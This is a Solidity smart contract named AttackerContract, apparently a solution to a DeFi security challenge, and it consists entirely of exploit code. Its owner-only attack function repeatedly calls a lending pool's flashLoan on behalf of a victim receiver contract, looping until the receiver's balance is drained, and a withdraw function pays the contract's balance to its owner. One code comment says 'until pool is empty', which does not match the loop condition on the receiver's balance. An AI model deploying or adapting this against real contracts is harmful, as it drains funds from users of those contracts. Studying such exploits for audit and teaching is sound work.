// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

//Importing OpenZeppelin's Onlyowner Implementation
import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

contract AttackerContract is Ownable {
    using Address for address;

    address private pool;
    address private receiver;

    error PoolAndReceiverMustBeContracts();

    constructor(address _pool, address _receiver) {
        if (_pool.isContract() && _receiver.isContract()) {
            pool = _pool;
            receiver = _receiver;
        } else {
            revert PoolAndReceiverMustBeContracts();
        }
    }

    function attack() public onlyOwner {
        uint256 amount = pool.balance;
        // make while loop to call flashloan until pool is empty
        while (receiver.balance > 0) {
            pool.functionCall(abi.encodeWithSignature("flashLoan(address,uint256)", receiver, amount));
        }
    }

    function withdraw() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {}
}
